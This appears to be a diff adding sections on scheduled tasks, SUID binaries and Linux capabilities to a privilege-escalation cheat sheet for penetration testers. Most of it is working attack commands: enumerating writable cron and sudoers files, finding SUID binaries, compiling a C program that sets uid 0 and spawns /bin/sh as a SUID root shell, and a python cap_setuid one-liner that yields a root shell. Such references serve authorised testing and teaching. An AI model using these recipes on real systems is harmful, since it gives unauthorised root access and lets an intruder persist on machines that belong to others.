@@ -258,3 +258,137 @@ cp /bin/bash .
 # set suid permission
 chmod +s bash 	
 ```
+
+
+
+## 7] Scheduled tasks
+
+### CRON JOBS
+
+Check if you have access with write permission on these files.  
+
+
+```
+/etc/init.d
+/etc/cron*
+/etc/crontab
+/etc/cron.allow
+/etc/cron.d
+/etc/cron.deny
+/etc/cron.daily
+/etc/cron.hourly
+/etc/cron.monthly
+/etc/cron.weekly
+/etc/sudoers
+/etc/exports
+/etc/anacrontab
+/var/spool/cron
+/var/spool/cron/crontabs/root
+
+crontab -l
+ls -alh /var/spool/cron;
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny*
+
+```
+
+You can use  [pspy](https://github.com/DominicBreuker/pspy)  to detect a CRON job.
+
+```
+# print both commands and file system events and scan procfs every 1000 ms (=1sec)
+./pspy64 -pf -i 1000
+```
+
+### Systemd timers
+
+```
+systemctl list-timers --all
+NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
+Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
+Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
+Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+```
+&nbsp;
+
+## 8] SUID
+
+SUID/Setuid stands for “set user ID upon execution”, it is enabled by default in every Linux distributions. If a file with this bit is ran, the uid will be changed by the owner one. If the file owner is  `root`, the uid will be changed to  `root`  even if it was executed from user  `bob`. SUID bit is represented by an  `s`.
+
+```
+╭─local_host@kali ~  
+╰─$ ls /usr/bin/sudo -alh                  
+-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
+
+```
+
+### FIND SUID BINARIES
+
+```
+find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+```
+```
+find / -uid 0 -perm -4000 -type f 2>/dev/null
+```
+
+
+### CREATE A SUID BINARY
+
+```
+print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
+```
+```
+gcc -o /tmp/suid /tmp/suid.c  
+```
+```
+sudo chmod +x /tmp/suid 
+```
+```
+sudo chmod +s /tmp/suid 
+```
+&nbsp;
+## 9] Capabilities
+
+### LIST CAPABILITIES OF BINARIES
+
+```
+╭─local_host@kali ~  
+╰─$ /usr/bin/getcap -r  /usr/bin
+/usr/bin/fping                = cap_net_raw+ep
+/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/bin/rlogin               = cap_net_bind_service+ep
+/usr/bin/ping                 = cap_net_raw+ep
+/usr/bin/rsh                  = cap_net_bind_service+ep
+/usr/bin/rcp                  = cap_net_bind_service+ep
+```
+
+### EDIT CAPABILITIES
+
+```
+/usr/bin/setcap -r /bin/ping            # remove
+/usr/bin/setcap cap_net_raw+p /bin/ping # add
+```
+
+### INTERESTING CAPABILITIES
+
+Having the capability =ep means the binary has all the capabilities.
+
+```
+$ getcap openssl /usr/bin/openssl
+openssl=ep
+```
+
+Example of privilege escalation with  `cap_setuid+ep`
+
+```
+$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
+
+$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+sh-5.0# id
+uid=0(root) gid=1000(swissky)
+```
